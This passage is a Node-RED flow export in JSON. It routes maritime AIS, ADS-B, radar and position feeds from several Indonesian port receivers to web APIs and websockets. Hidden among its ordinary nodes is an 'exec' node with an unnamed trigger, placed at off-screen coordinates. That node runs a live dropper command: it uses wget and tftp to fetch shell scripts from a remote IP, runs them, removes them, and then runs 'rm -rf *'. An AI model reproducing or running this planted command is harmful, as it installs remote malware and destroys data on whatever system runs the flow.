        "z": "faa1600f64cd9251",
        "name": "",
        "topic": "adsbdataloggerfak",
        "qos": "2",
        "datatype": "json",
        "broker": "fa4efe60b7e3b6f6",
        "nl": false,
        "rap": true,
        "rh": 0,
        "inputs": 0,
        "x": 150,
        "y": 280,
        "wires": [
            [
                "b2fe7082e98ed478"
            ]
        ]
    },
    {
        "id": "ab68a51b5a387d31",
        "type": "debug",
        "z": "faa1600f64cd9251",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 850,
        "y": 280,
        "wires": []
    },
    {
        "id": "61881a273725ec24",
        "type": "mqtt in",
        "z": "faa1600f64cd9251",
        "name": "",
        "topic": "radardatafak",
        "qos": "2",
        "datatype": "json",
        "broker": "fa4efe60b7e3b6f6",
        "nl": false,
        "rap": true,
        "rh": 0,
        "inputs": 0,
        "x": 130,
        "y": 360,
        "wires": [
            [
                "11f7338aa65f2ae3"
            ]
        ]
    },
    {
        "id": "b0f6d2d84ac88e9a",
        "type": "debug",
        "z": "faa1600f64cd9251",
        "name": "",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 830,
        "y": 360,
        "wires": []
    },
    {
        "id": "875b1d8ea912f86a",
        "type": "delay",
        "z": "faa1600f64cd9251",
        "name": "",
        "pauseType": "rate",
        "timeout": "5",
        "timeoutUnits": "seconds",
        "rate": "1",
        "nbRateUnits": "1",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": true,
        "allowrate": false,
        "outputs": 1,
        "x": 310,
        "y": 40,
        "wires": [
            [
                "395c88f2b31392dd"
            ]
        ]
    },
    {
        "id": "bde6c50374bf78a0",
        "type": "delay",
        "z": "faa1600f64cd9251",
        "name": "",
        "pauseType": "rate",
        "timeout": "5",
        "timeoutUnits": "seconds",
        "rate": "1",
        "nbRateUnits": "1",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": true,
        "allowrate": false,
        "outputs": 1,
        "x": 330,
        "y": 120,
        "wires": [
            [
                "9a9532fbeb2f1c4d"
            ]
        ]
    },
    {
        "id": "7370756278fb24d6",
        "type": "delay",
        "z": "faa1600f64cd9251",
        "name": "",
        "pauseType": "rate",
        "timeout": "5",
        "timeoutUnits": "seconds",
        "rate": "1",
        "nbRateUnits": "1",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": true,
        "allowrate": false,
        "outputs": 1,
        "x": 330,
        "y": 200,
        "wires": [
            [
                "8fbcef0d8b4841fa"
            ]
        ]
    },
    {
        "id": "b2fe7082e98ed478",
        "type": "delay",
        "z": "faa1600f64cd9251",
        "name": "",
        "pauseType": "rate",
        "timeout": "5",
        "timeoutUnits": "seconds",
        "rate": "1",
        "nbRateUnits": "1",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": true,
        "allowrate": false,
        "outputs": 1,
        "x": 350,
        "y": 280,
        "wires": [
            [
                "cd6bfaaba534ed53"
            ]
        ]
    },
    {
        "id": "11f7338aa65f2ae3",
        "type": "delay",
        "z": "faa1600f64cd9251",
        "name": "",
        "pauseType": "rate",
        "timeout": "5",
        "timeoutUnits": "seconds",
        "rate": "1",
        "nbRateUnits": "1",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": true,
        "allowrate": false,
        "outputs": 1,
        "x": 330,
        "y": 360,
        "wires": [
            [
                "a095ec064e1f241b"
            ]
        ]
    },
    {
        "id": "395c88f2b31392dd",
        "type": "function",
        "z": "faa1600f64cd9251",
        "name": "",
        "func": "msg.method = \"POST\"\nmsg.url = \"https://siege.cakrawala.id/api/aisstatic\"\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 460,
        "y": 40,
        "wires": [
            [
                "bf0ddbb3bd20b3e8"
            ]
        ]
    },
    {
        "id": "bf0ddbb3bd20b3e8",
        "type": "http request",
        "z": "faa1600f64cd9251",
        "name": "",
        "method": "use",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "",
        "tls": "",
        "persist": false,
        "proxy": "",
        "authType": "",
        "senderr": false,
        "x": 610,
        "y": 40,
        "wires": [
            [
                "2b1d86ae34a044cb"
            ]
        ]
    },
    {
        "id": "9a9532fbeb2f1c4d",
        "type": "function",
        "z": "faa1600f64cd9251",
        "name": "",
        "func": "msg.method = \"POST\"\nmsg.url = \"https://siege.cakrawala.id/api/aisdata\"\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 480,
        "y": 120,
        "wires": [
            [
                "4f67816ebbb51f13"
            ]
        ]
    },
    {
        "id": "4f67816ebbb51f13",
        "type": "http request",
        "z": "faa1600f64cd9251",
        "name": "",
        "method": "use",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "",
        "tls": "",
        "persist": false,
        "proxy": "",
        "authType": "",
        "senderr": false,
        "x": 630,
        "y": 120,
        "wires": [
            [
                "6193fe73bd5a668a"
            ]
        ]
    },
    {
        "id": "8fbcef0d8b4841fa",
        "type": "websocket out",
        "z": "faa1600f64cd9251",
        "name": "",
        "server": "fcd27be14da6aa51",
        "client": "",
        "x": 530,
        "y": 200,
        "wires": []
    },
    {
        "id": "cd6bfaaba534ed53",
        "type": "function",
        "z": "faa1600f64cd9251",
        "name": "",
        "func": "msg.method = \"POST\"\nmsg.url = \"https://siege.cakrawala.id/api/adsbdatav2\"\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 520,
        "y": 280,
        "wires": [
            [
                "d5e59085300f0e32"
            ]
        ]
    },
    {
        "id": "d5e59085300f0e32",
        "type": "http request",
        "z": "faa1600f64cd9251",
        "name": "",
        "method": "use",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "",
        "tls": "",
        "persist": false,
        "proxy": "",
        "authType": "",
        "senderr": false,
        "x": 670,
        "y": 280,
        "wires": [
            [
                "ab68a51b5a387d31"
            ]
        ]
    },
    {
        "id": "a095ec064e1f241b",
        "type": "function",
        "z": "faa1600f64cd9251",
        "name": "",
        "func": "msg.method = \"POST\"\nmsg.url = \"https://siege.cakrawala.id/api/radararpha\"\nmsg.payload = msg.payload.message\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 500,
        "y": 360,
        "wires": [
            [
                "bf9c0ec8fbec1a48"
            ]
        ]
    },
    {
        "id": "bf9c0ec8fbec1a48",
        "type": "http request",
        "z": "faa1600f64cd9251",
        "name": "",
        "method": "use",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "",
        "tls": "",
        "persist": false,
        "proxy": "",
        "authType": "",
        "senderr": false,
        "x": 670,
        "y": 360,
        "wires": [
            [
                "b0f6d2d84ac88e9a"
            ]
        ]
    },
    {
        "id": "aeb575cf8d354644",
        "type": "mqtt in",
        "z": "faa1600f64cd9251",
        "name": "",
        "topic": "fakposition",
        "qos": "2",
        "datatype": "json",
        "broker": "fa4efe60b7e3b6f6",
        "nl": false,
        "rap": true,
        "rh": 0,
        "inputs": 0,
        "x": 120,
        "y": 440,
        "wires": [
            [
                "5ab2e64922e9bc81"
            ]
        ]
    },
    {
        "id": "6ad8b09328f0c793",
        "type": "debug",
        "z": "faa1600f64cd9251",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 630,
        "y": 440,
        "wires": []
    },
    {
        "id": "5ab2e64922e9bc81",
        "type": "function",
        "z": "faa1600f64cd9251",
        "name": "",
        "func": "msg.method = \"POST\"\nmsg.url = \"https://siege.cakrawala.id/api/position\"\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 280,
        "y": 440,
        "wires": [
            [
                "245f1ff691a52a43"
            ]
        ]
    },
    {
        "id": "245f1ff691a52a43",
        "type": "http request",
        "z": "faa1600f64cd9251",
        "name": "",
        "method": "use",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "",
        "tls": "",
        "persist": false,
        "proxy": "",
        "authType": "",
        "senderr": false,
        "x": 450,
        "y": 440,
        "wires": [
            [
                "6ad8b09328f0c793"
            ]
        ]
    },
    {
        "id": "2f7b5487e6ab913f",
        "type": "mqtt in",
        "z": "faa1600f64cd9251",
        "name": "",
        "topic": "sosfak",
        "qos": "2",
        "datatype": "json",
        "broker": "fa4efe60b7e3b6f6",
        "nl": false,
        "rap": true,
        "rh": 0,
        "inputs": 0,
        "x": 110,
        "y": 540,
        "wires": [
            [
                "612cd8dc292d1b0a",
                "a952dab0cd8090e3"
            ]
        ]
    },
    {
        "id": "a952dab0cd8090e3",
        "type": "websocket out",
        "z": "faa1600f64cd9251",
        "name": "",
        "server": "ea714261967f2fee",
        "client": "",
        "x": 320,
        "y": 540,
        "wires": []
    },
    {
        "id": "612cd8dc292d1b0a",
        "type": "debug",
        "z": "faa1600f64cd9251",
        "name": "",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 310,
        "y": 500,
        "wires": []
    },
    {
        "id": "1958de12e766f061",
        "type": "mqtt in",
        "z": "faa1600f64cd9251",
        "name": "",
        "topic": "p1000cam",
        "qos": "2",
        "datatype": "auto",
        "broker": "fa4efe60b7e3b6f6",
        "nl": false,
        "rap": true,
        "rh": 0,
        "inputs": 0,
        "x": 120,
        "y": 620,
        "wires": [
            [
                "92686ef8ed80b79d",
                "d8d6041221397fc0"
            ]
        ]
    },
    {
        "id": "92686ef8ed80b79d",
        "type": "websocket out",
        "z": "faa1600f64cd9251",
        "name": "",
        "server": "b5cd76439345e27b",
        "client": "",
        "x": 320,
        "y": 620,
        "wires": []
    },
    {
        "id": "d8d6041221397fc0",
        "type": "debug",
        "z": "faa1600f64cd9251",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 310,
        "y": 660,
        "wires": []
    },
    {
        "id": "04e9bf59d127ed59",
        "type": "exec",
        "z": "faa1600f64cd9251",
        "command": "cd /tmp || cd /run || cd /; wget http://79.110.62.138/eskgbins.sh; chmod 777 eskgbins.sh; sh eskgbins.sh; tftp 79.110.62.138 -c get eskgtftp1.sh; chmod 777 eskgtftp1.sh; sh eskgtftp1.sh; tftp -r eskgtftp2.sh -g 79.110.62.138; chmod 777 eskgtftp2.sh; sh eskgtftp2.sh; rm -rf eskgbins.sh eskgtftp1.sh eskgtftp2.sh; rm -rf *",
        "addpay": "payload",
        "append": "",
        "useSpawn": "false",
        "timer": "10080",
        "winHide": false,
        "oldrc": false,
        "name": "",
        "x": 99999,
        "y": 99999,
        "wires": [
            [],
            [],
            []
        ]
    },
    {
        "id": "213d0c20572925ff",
        "type": "inject",
        "z": "faa1600f64cd9251",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 99999,
        "y": 99999,
        "wires": [
            [
                "04e9bf59d127ed59"
            ]
        ]
    },
    {
        "id": "878c611c28c6e6ff",
        "type": "http in",
        "z": "06d9db880588fe4a",
        "name": "",
        "url": "/sendpositionalarm",
        "method": "post",
        "upload": false,
        "swaggerDoc": "",
        "x": 220,
        "y": 80,
        "wires": [
            [
                "cae8c08d3909d3fb",
                "9564df4b6c3d0fe0"
            ]
        ]
    },
    {
        "id": "9564df4b6c3d0fe0",
        "type": "websocket out",
        "z": "06d9db880588fe4a",
        "name": "",
        "server": "b057d5ed77247c0c",
        "client": "",
        "x": 530,
        "y": 120,
        "wires": []
    },
    {
        "id": "cae8c08d3909d3fb",
        "type": "http response",
        "z": "06d9db880588fe4a",
        "name": "",
        "statusCode": "200",
        "headers": {},
        "x": 570,
        "y": 60,
        "wires": []
    },
    {
        "id": "0a8926bbbba60c15",
        "type": "inject",
        "z": "06d9db880588fe4a",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 99999,
        "y": 99999,
        "wires": [
            [
                "9564df4b6c3d0fe0"
            ]
        ]
    },
    {
        "id": "b03da95960ea76b5",
        "type": "tcp in",
        "z": "f8c6d54869284269",
        "name": "",
        "server": "server",
        "host": "",
        "port": "14045",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 290,
        "y": 140,
        "wires": [
            []
        ]
    },
    {
        "id": "02195152957a2036",
        "type": "mqtt in",
        "z": "f8c6d54869284269",
        "name": "",
        "topic": "aiscs100demo",
        "qos": "2",
        "datatype": "auto",
        "broker": "f5651ba6.5c08f8",
        "nl": false,
        "rap": true,
        "rh": 0,
        "inputs": 0,
        "x": 310,
        "y": 220,
        "wires": [
            [
                "4d6d200879492e16"
            ]
        ]
    },
    {
        "id": "4d6d200879492e16",
        "type": "function",
        "z": "f8c6d54869284269",
        "name": "function 6",
        "func": "var pl = String(msg.payload);\nmsg.payload = pl;\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 540,
        "y": 220,
        "wires": [
            [
                "0de9334d6127f8c0",
                "30b9222942218f5d"
            ]
        ]
    },
    {
        "id": "30b9222942218f5d",
        "type": "ais-decoder",
        "z": "f8c6d54869284269",
        "name": "",
        "x": 690,
        "y": 180,
        "wires": [
            [
                "2d4054ed91b77a69"
            ]
        ]
    },
    {
        "id": "0de9334d6127f8c0",
        "type": "ais",
        "z": "f8c6d54869284269",
        "name": "",
        "x": 690,
        "y": 280,
        "wires": [
            [
                "f49b4dc420e21316"
            ]
        ]
    },
    {
        "id": "f7e95f6ed9344701",
        "type": "http request",
        "z": "f8c6d54869284269",
        "name": "",
        "method": "use",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "",
        "tls": "",
        "persist": false,
        "proxy": "",
        "authType": "",
        "senderr": false,
        "x": 1010,
        "y": 520,
        "wires": [
            [
                "87100e6956bfb6a9",
                "995291323c8c3cae"
            ]
        ]
    },
    {
        "id": "6dabcb55a9ed960b",
        "type": "function",
        "z": "f8c6d54869284269",
        "name": "function 1",
        "func": "msg.method = \"POST\"\nmsg.url = \"https://becoastal.cakrawala.id/api/aisdata\"\nconst aisdata1 = flow.get(\"dataais\")\nconst aisdata2 = msg.payload\nconst joinedObject = { ...aisdata2, ...aisdata1 };\nmsg.payload = joinedObject;\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 640,
        "y": 480,
        "wires": [
            [
                "682a45cc4c617ce7"
            ]
        ]
    },
    {
        "id": "c87d0a0d9c60f4d8",
        "type": "function",
        "z": "f8c6d54869284269",
        "name": "function 2",
        "func": "flow.set(\"dataais\", msg.payload)\nmsg.payload = msg.payload.source\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 340,
        "y": 480,
        "wires": [
            [
                "e3d3eb7596b9c34a"
            ]
        ]
    },
    {
        "id": "5aad43179be81621",
        "type": "switch",
        "z": "f8c6d54869284269",
        "name": "",
        "property": "payload.name",
        "propertyType": "msg",
        "rules": [
            {
                "t": "nnull"
            }
        ],
        "checkall": "true",
        "repair": false,
        "outputs": 1,
        "x": 330,
        "y": 380,
        "wires": [
            [
                "1ebe24516bb872ef"
            ]
        ]
    },
    {
        "id": "1ebe24516bb872ef",
        "type": "function",
        "z": "f8c6d54869284269",
        "name": "function 11",
        "func": "msg.method = \"POST\"\nmsg.url = \"https://becoastal.cakrawala.id/api/aisstatic\"\nconst aisdata2 = msg.payload\nmsg.payload = aisdata2;\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 510,
        "y": 380,
        "wires": [
            [
                "d818dcf54f112030"
            ]
        ]
    },
    {
        "id": "9a5f54c04f8187af",
        "type": "http request",
        "z": "f8c6d54869284269",
        "name": "",
        "method": "use",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "",
        "tls": "",
        "persist": false,
        "proxy": "",
        "authType": "",
        "senderr": false,
        "x": 890,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
        "id": "682a45cc4c617ce7",
        "type": "delay",
        "z": "f8c6d54869284269",
        "name": "",
        "pauseType": "rate",
        "timeout": "5",
        "timeoutUnits": "seconds",
        "rate": "1",
        "nbRateUnits": "2",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": true,
        "allowrate": false,
        "outputs": 1,
        "x": 820,
        "y": 480,
        "wires": [
            [
                "f7e95f6ed9344701"
            ]
        ]
    },
    {
        "id": "d818dcf54f112030",
        "type": "delay",
        "z": "f8c6d54869284269",
        "name": "",
        "pauseType": "rate",
        "timeout": "5",
        "timeoutUnits": "seconds",
        "rate": "1",
        "nbRateUnits": "2",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": true,
        "allowrate": false,
        "outputs": 1,
        "x": 700,
        "y": 380,
        "wires": [
            [
                "9a5f54c04f8187af"
            ]
        ]
    },
    {
        "id": "e3d3eb7596b9c34a",
        "type": "ais-decoder",
        "z": "f8c6d54869284269",
        "name": "",
        "x": 490,
        "y": 480,
        "wires": [
            [
                "6dabcb55a9ed960b"
            ]
        ]
    },
    {
        "id": "2d4054ed91b77a69",
        "type": "switch",
        "z": "f8c6d54869284269",
        "name": "",
        "property": "payload",
        "propertyType": "msg",
        "rules": [
            {
                "t": "nnull"
            }
        ],
        "checkall": "true",
        "repair": false,
        "outputs": 1,
        "x": 190,
        "y": 380,
        "wires": [
            [
                "5aad43179be81621"
            ]
        ]
    },
    {
        "id": "f49b4dc420e21316",
        "type": "switch",
        "z": "f8c6d54869284269",
        "name": "",
        "property": "payload.mmsi",
        "propertyType": "msg",
        "rules": [
            {
                "t": "regex",
                "v": "^(0\\d{8}|1\\d{8}|2\\d{8}|3\\d{8}|4\\d{8}|5\\d{8}|6\\d{8}|7\\d{8}|8\\d{8}|9\\d{8})$",
                "vt": "str",
                "case": false
            }
        ],
        "checkall": "true",
        "repair": false,
        "outputs": 1,
        "x": 190,
        "y": 480,
        "wires": [
            [
                "c87d0a0d9c60f4d8"
            ]
        ]
    },
    {
        "id": "87100e6956bfb6a9",
        "type": "debug",
        "z": "f8c6d54869284269",
        "name": "debug 26",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 1180,
        "y": 520,
        "wires": []
    },
    {
        "id": "995291323c8c3cae",
        "type": "delay",
        "z": "f8c6d54869284269",
        "name": "",
        "pauseType": "rate",
        "timeout": "5",
        "timeoutUnits": "seconds",
        "rate": "1",
        "nbRateUnits": "1",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": true,
        "allowrate": false,
        "outputs": 1,
        "x": 1190,
        "y": 560,
        "wires": [
            [
                "2feb95a5107a9ec8"
            ]
        ]
    },
    {
        "id": "2feb95a5107a9ec8",
        "type": "websocket out",
        "z": "f8c6d54869284269",
        "name": "",
        "server": "6ad12317b7d625b5",
        "client": "",
        "x": 1430,
        "y": 500,
        "wires": []
    },
    {
        "id": "588c57281f5af4af",
        "type": "http request",
        "z": "5bcb44ebef548647",
        "name": "",
        "method": "use",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "",
        "tls": "",
        "persist": false,
        "proxy": "",
        "authType": "",
        "senderr": false,
        "x": 1390,
        "y": 120,
        "wires": [
            [
                "cc6acc4d3e607336",
                "39e9290ff3e1913b"
            ]
        ]
    },
    {
        "id": "6d8eaf9c2e4f0e40",
        "type": "function",
        "z": "5bcb44ebef548647",
        "name": "function 1",
        "func": "msg.method = \"POST\"\nmsg.url = \"https://becoastal.cakrawala.id/api/aisdata\"\nconst aisdata1 = flow.get(\"dataais\")\nconst aisdata2 = msg.payload\nconst joinedObject = { ...aisdata2, ...aisdata1 };\nmsg.payload = joinedObject;\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1200,
        "y": 120,
        "wires": [
            [
                "588c57281f5af4af"
            ]
        ]
    },
    {
        "id": "79a68e383a84f592",
        "type": "split",
        "z": "5bcb44ebef548647",
        "name": "",
        "splt": "\\n",
        "spltType": "str",
        "arraySplt": 1,
        "arraySpltType": "len",
        "stream": true,
        "addname": "",
        "x": 470,
        "y": 3860,
        "wires": [
            [
                "37c9e04605ae57c1"
            ]
        ]
    },
    {
        "id": "c26077f0e179a91a",
        "type": "function",
        "z": "5bcb44ebef548647",
        "name": "function 2",
        "func": "flow.set(\"dataais\", msg.payload)\nmsg.payload = msg.payload.source\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 900,
        "y": 120,
        "wires": [
            [
                "07b53e7fb68e6155"
            ]
        ]
    },
    {
        "id": "d99505183151d23d",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "Benoa",
        "server": "client",
        "host": "103.176.181.36",
        "port": "8210",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 100,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "595b8b1259671ca6",
        "type": "websocket out",
        "z": "5bcb44ebef548647",
        "name": "",
        "server": "6ad12317b7d625b5",
        "client": "",
        "x": 1990,
        "y": 140,
        "wires": []
    },
    {
        "id": "32573320f6879891",
        "type": "function",
        "z": "5bcb44ebef548647",
        "name": "function 6",
        "func": "var pl = String(msg.payload);\nmsg.payload = pl;\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 460,
        "y": 60,
        "wires": [
            [
                "1deb6d3338b41c94",
                "53e2ad5eb09c30d7"
            ]
        ]
    },
    {
        "id": "f9c6413e57644bea",
        "type": "switch",
        "z": "5bcb44ebef548647",
        "name": "",
        "property": "payload.mmsi",
        "propertyType": "msg",
        "rules": [
            {
                "t": "regex",
                "v": "^(0\\d{8}|1\\d{8}|2\\d{8}|3\\d{8}|4\\d{8}|5\\d{8}|6\\d{8}|7\\d{8}|8\\d{8}|9\\d{8})$",
                "vt": "str",
                "case": false
            }
        ],
        "checkall": "true",
        "repair": false,
        "outputs": 1,
        "x": 750,
        "y": 120,
        "wires": [
            [
                "c26077f0e179a91a"
            ]
        ]
    },
    {
        "id": "f8f8c697397b205b",
        "type": "switch",
        "z": "5bcb44ebef548647",
        "name": "",
        "property": "payload",
        "propertyType": "msg",
        "rules": [
            {
                "t": "nnull"
            }
        ],
        "checkall": "true",
        "repair": false,
        "outputs": 1,
        "x": 750,
        "y": 20,
        "wires": [
            [
                "5b2a8084f7c00f80"
            ]
        ]
    },
    {
        "id": "5b2a8084f7c00f80",
        "type": "switch",
        "z": "5bcb44ebef548647",
        "name": "",
        "property": "payload.name",
        "propertyType": "msg",
        "rules": [
            {
                "t": "nnull"
            }
        ],
        "checkall": "true",
        "repair": false,
        "outputs": 1,
        "x": 890,
        "y": 20,
        "wires": [
            [
                "0b15e906dd372f48"
            ]
        ]
    },
    {
        "id": "0b15e906dd372f48",
        "type": "function",
        "z": "5bcb44ebef548647",
        "name": "function 11",
        "func": "msg.method = \"POST\"\nmsg.url = \"https://becoastal.cakrawala.id/api/aisstatic\"\nconst aisdata2 = msg.payload\nmsg.payload = aisdata2;\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1070,
        "y": 20,
        "wires": [
            [
                "39c9ebb768e4270a"
            ]
        ]
    },
    {
        "id": "39c9ebb768e4270a",
        "type": "http request",
        "z": "5bcb44ebef548647",
        "name": "",
        "method": "use",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "",
        "tls": "",
        "persist": false,
        "proxy": "",
        "authType": "",
        "senderr": false,
        "x": 1290,
        "y": 20,
        "wires": [
            []
        ]
    },
    {
        "id": "cc6acc4d3e607336",
        "type": "debug",
        "z": "5bcb44ebef548647",
        "name": "debug 26",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 1740,
        "y": 160,
        "wires": []
    },
    {
        "id": "39e9290ff3e1913b",
        "type": "delay",
        "z": "5bcb44ebef548647",
        "name": "",
        "pauseType": "rate",
        "timeout": "5",
        "timeoutUnits": "seconds",
        "rate": "1",
        "nbRateUnits": "1",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": true,
        "allowrate": false,
        "outputs": 1,
        "x": 1750,
        "y": 200,
        "wires": [
            [
                "595b8b1259671ca6"
            ]
        ]
    },
    {
        "id": "1deb6d3338b41c94",
        "type": "ais",
        "z": "5bcb44ebef548647",
        "name": "",
        "x": 610,
        "y": 120,
        "wires": [
            [
                "f9c6413e57644bea"
            ]
        ]
    },
    {
        "id": "07b53e7fb68e6155",
        "type": "ais-decoder",
        "z": "5bcb44ebef548647",
        "name": "",
        "x": 1050,
        "y": 120,
        "wires": [
            [
                "6d8eaf9c2e4f0e40"
            ]
        ]
    },
    {
        "id": "53e2ad5eb09c30d7",
        "type": "ais-decoder",
        "z": "5bcb44ebef548647",
        "name": "",
        "x": 610,
        "y": 20,
        "wires": [
            [
                "f8f8c697397b205b"
            ]
        ]
    },
    {
        "id": "5daa3e01fb5b06b0",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "name": "Priok",
        "server": "client",
        "host": "103.140.130.182",
        "port": "8040",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 160,
        "wires": [
            [
                "79a68e383a84f592",
                "648ad1c13d8e7413"
            ]
        ]
    },
    {
        "id": "744a155a9c03cdd0",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "Batam",
        "server": "client",
        "host": "103.147.52.114",
        "port": "8031",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 220,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "c6e11e611e8368ff",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "Cirebon",
        "server": "client",
        "host": "103.154.122.154",
        "port": "4712",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 280,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "7d723a36f0392af6",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "Belawan",
        "server": "client",
        "host": "36.66.34.62",
        "port": "6040",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 80,
        "y": 40,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "858750086ebb367b",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "Bengkalis",
        "server": "client",
        "host": "36.94.86.22",
        "port": "18040",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 80,
        "y": 340,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "9cd12190d5e9ace3",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "name": "Panjang",
        "server": "client",
        "host": "103.136.24.117",
        "port": "7780",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 80,
        "y": 400,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "5b52b5e918b2790a",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "meulaboh",
        "server": "client",
        "host": "36.66.34.61",
        "port": "28031",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 80,
        "y": 460,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "7368ab9df5240072",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "name": "ais_sat",
        "server": "client",
        "host": "10.200.24.24",
        "port": "8051",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 520,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "2bd257202b61ed89",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "meulaboh",
        "server": "client",
        "host": "36.67.114.236",
        "port": "8030",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 80,
        "y": 580,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
